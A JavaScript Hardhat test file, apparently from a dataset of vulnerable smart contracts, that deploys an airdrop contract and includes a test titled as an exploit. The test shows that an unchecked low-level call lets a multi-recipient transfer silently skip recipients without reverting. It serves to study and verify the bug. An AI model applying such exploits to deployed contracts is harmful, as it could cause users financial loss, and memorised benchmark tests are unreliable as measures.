const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/0x4051334adc52057aca763453820cb0e045076ef3.sol", function () {
  let owner, sig;
  async function deployContracts() {
    [owner, sig] = await ethers.getSigners();
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x4051334adc52057aca763453820cb0e045076ef3.sol/airdrop.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const airdrop = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await airdrop.deploy();

    const TokenEBU = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/TokenEBU.sol:TokenEBU",
    );
    const token = await TokenEBU.connect(owner).deploy(1, "EBU", "EBU");

    const SuccessContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/success_contract.sol:SuccessContract",
    );
    const success_contract = await SuccessContract.deploy();

    return { contract, token, success_contract };
  }

  it("functional check: unchecked_low_level_calls/0x4051334adc52057aca763453820cb0e045076ef3.sol", async function () {
    const { contract, success_contract } = await loadFixture(deployContracts);
    //oracle: verify that transfer can be called, and it does not revert
    const amount = ethers.parseEther("1");
    await expect(
      contract
        .connect(sig)
        .transfer(
          owner.address,
          success_contract.target,
          [contract.target],
          amount,
        ),
    ).to.not.be.reverted;
    //oracle: verify that transfer send the correct amount to the success contract
    expect(await success_contract.balanceOf(contract.target)).to.be.equal(
      amount,
    );
  });

  it("exploit unchecked low level call vulnerability", async function () {
    const { contract, token } = await loadFixture(deployContracts);

    const amount = await token.balanceOf(owner.address);
    expect(amount).to.be.equal(1000000000000000000n);
    expect(await token.balanceOf(contract.target)).to.be.equal(0);
    expect(await token.balanceOf(sig.address)).to.be.equal(0);

    await token.connect(owner).approve(contract.target, 10);

    const value = await token.allowance(owner.address, contract.target);
    expect(value).to.be.equal(10);

    const from = owner.address;

    const to = [contract.target, sig.address];

    const val = 10;

    // it does not revert cause the return value of call is not checked
    await expect(contract.transfer(from, token.target, to, val)).not.be
      .reverted;
    // the second transfer does not happen
    expect(await token.balanceOf(owner)).to.be.equal(amount - BigInt(val));
    expect(await token.balanceOf(contract.target)).to.be.equal(10);
    expect(await token.balanceOf(sig.address)).to.be.equal(0);
  });
});
